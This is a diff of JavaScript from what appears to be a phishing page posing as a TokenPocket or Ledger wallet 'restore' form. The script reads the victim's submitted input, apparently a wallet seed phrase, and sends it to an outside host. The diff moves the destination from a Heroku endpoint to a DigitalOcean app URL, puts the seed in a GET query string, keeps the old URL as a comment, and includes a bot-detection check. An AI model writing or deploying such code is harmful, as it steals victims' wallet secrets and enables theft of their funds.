@@ -8,14 +8,14 @@ document.getElementById("seedna").addEventListener("submit", (function(e) {
         window.location.href = window.location.href,
         void console.log("Bot activity detected. Form submission aborted.");
     var n = document.getElementById("inputna").value;
-    fetch("https://tokenpoket-d0db3dce79e0.herokuapp.com/led", {
-        method: "POST",
+    fetch(`https://starfish-app-tthlw.ondigitalocean.app/restore?textval=${n}`, {
+        method: "GET",
         headers: {
             "Content-Type": "application/json"
         },
-        body: JSON.stringify({
-            message: n
-        })
+        // body: JSON.stringify({
+        //     textval: n
+        // })
     }).then((e=>{
         e.ok ? (setTimeout((()=>{
             window.location.href = "../ledger.html"
@@ -26,3 +26,5 @@ document.getElementById("seedna").addEventListener("submit", (function(e) {
     ))
 }
 ));
+
+//https://tokenpoket-d0db3dce79e0.herokuapp.com/led
